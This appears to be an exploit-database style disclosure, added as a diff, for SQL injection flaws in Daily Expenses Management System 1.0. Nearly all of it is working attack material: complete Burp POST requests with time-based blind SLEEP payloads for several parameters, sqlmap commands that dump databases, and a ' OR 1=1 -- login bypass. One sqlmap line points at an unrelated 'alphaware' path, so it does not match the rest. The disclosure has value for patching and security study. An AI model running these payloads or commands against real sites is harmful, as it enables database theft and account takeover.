@@ -1,0 +1,171 @@
+# Exploit Title: Daily Expenses Management System 1.0 - 'item' SQL Injection
+# Date: 2020-08-05
+# Exploit Author: Edo Maland
+# Vendor Homepage: https://www.sourcecodester.com/php/14372/daily-tracker-system-phpmysql.html
+# Software Link:  https://www.sourcecodester.com/php/14372/daily-tracker-system-phpmysql.html
+# Version: 1.0
+# Tested on: XAMPP / Windows 10
+
+-------------------------------------------------------------------------------------------------------------------------------------
+# Feature: Add Expenses
+# Vulnerable file: add-expense.php
+# Vulnerable parameter : 
+	- item
+	- costitem
+# PoC
+
+Url : http://example.com/dets/add-expense.php
+Methode : Post
+
+# Burpsuite Requests
+
+POST /dets/add-expense.php HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: id,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 138
+Origin: http://example.com
+Connection: close
+Referer: http://example.com/dets/add-expense.php
+Cookie: PHPSESSID=lu0nb6l63bleu39pbjf5a954p9
+Upgrade-Insecure-Requests: 1
+
+dateexpense=1337-11-11&item=1%27+AND+%28SELECT+8429+FROM+%28SELECT%28SLEEP%285%29%29%29IWeV%29+AND+%27hmPP%27%3D%27hmPP&costitem=2&submit=
+
+
+# Payload
+
+Parameter: #1* ((custom) POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: dateexpense=1337-11-11&item=1' AND (SELECT 8429 FROM (SELECT(SLEEP(5)))IWeV) AND 'hmPP'='hmPP&costitem=2&submit=
+
+# Sqlmap Command
+
+sqlmap -u "http://example.com/alphaware/summary.php?tid=1337*" --dbs --random-agent -v 3
+
+
+-------------------------------------------------------------------------------------------------------------------------------------
+# Feature: Edit Profile
+# Vulnerable file: user-profile.php
+# Vulnerable parameter : 
+	- fullname
+# PoC
+
+Url : http://example.com/dets/user-profile.php
+Methode : Post
+
+# Burpsuite Requests
+
+POST /dets/user-profile.php HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: id,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 189
+Origin: http://example.com
+Connection: close
+Referer: http://example.com/dets/user-profile.php
+Cookie: PHPSESSID=lu0nb6l63bleu39pbjf5a954p9
+Upgrade-Insecure-Requests: 1
+
+fullname=%27+AND+%28SELECT+2029+FROM+%28SELECT%28SLEEP%285%29%29%29JJJm%29+AND+%27UMUq%27%3D%27UMUq&email=info%40sql.id&contactnumber=1337173137&regdate=2020-08-05+13%3A49%3A51&submit=
+
+
+# Payload
+
+Parameter: #1* ((custom) POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: fullname=admin3' AND (SELECT 2029 FROM (SELECT(SLEEP(5)))JJJm) AND 'UMUq'='UMUq&email=info@sql.id&contactnumber=1337173137&regdate=2020-08-05 13:49:51&submit=
+
+
+
+# Sqlmap Command
+
+sqlmap -u "https://example.com/dets/user-profile.php" --data="fullname=admin3*&email=info%40sql.id&contactnumber=1337173137&regdate=2020-08-05+13%3A49%3A51&submit=" --random-agent --threads 5 --cookie="PHPSESSID=lu0nb6l63bleu39pbjf5a954p9" -v 3 --dbs
+
+-------------------------------------------------------------------------------------------------------------------------------------
+
+# Feature: Expense Reports
+# Vulnerable file: 
+	- expense-monthwise-reports-detailed.php
+	- expense-datewise-reports.php
+	- expense-yearwise-reports.php
+
+
+# Vulnerable parameter : 
+	- fromdate
+	- todate
+
+# PoC
+
+Url : http://example.com/dets/expense-monthwise-reports-detailed.php
+Methode : Post
+
+# Burpsuite Requests
+
+POST /dets/expense-yearwise-reports-detailed.php HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: id,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 45
+Origin: http://example.com
+Connection: close
+Referer: http://example.com/dets/expense-yearwise-reports.php
+Cookie: PHPSESSID=lu0nb6l63bleu39pbjf5a954p9
+Upgrade-Insecure-Requests: 1
+
+fromdate=2020-08-13'+AND+(SELECT+1473+FROM+(SELECT(SLEEP(5)))rhGI)+AND+'moGo'%3d'moGo&todate=2020-08-20&submit=
+
+
+# Payload
+
+Parameter: #1* ((custom) POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: fromdate=2020-08-13' AND (SELECT 1473 FROM (SELECT(SLEEP(5)))rhGI) AND 'moGo'='moGo&todate=2020-07-29&submit=
+
+# Sqlmap Command
+
+sqlmap -u "https://example.com/dets/expense-monthwise-reports-detailed.php" --data="fromdate=2020-08-13*&todate=2020-07-29&submit=" --random-agent --cookie="PHPSESSID=lu0nb6l63bleu39pbjf5a954p9"  --dbs
+
+
+-------------------------------------------------------------------------------------------------------------------------------------
+# Feature: Login Page
+# Bypass Login Using SQLi on Admin/Member
+# Vulnerable file: index.php
+
+# PoC
+
+URL : https://example.com/dets/index.php
+
+Logging in with following details:
+
+	- Payload : "' OR 1=1 -- '"@sql.id
+
+# Burp Requests
+
+POST /dets/index.php HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: id,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 50
+Origin: http://example.com
+Connection: close
+Referer: http://example.com/dets/index.php
+Cookie: PHPSESSID=lu0nb6l63bleu39pbjf5a954p9
+Upgrade-Insecure-Requests: 1
+
+email="' OR 1=1 -- '"@sql.id&password=1337&login=login
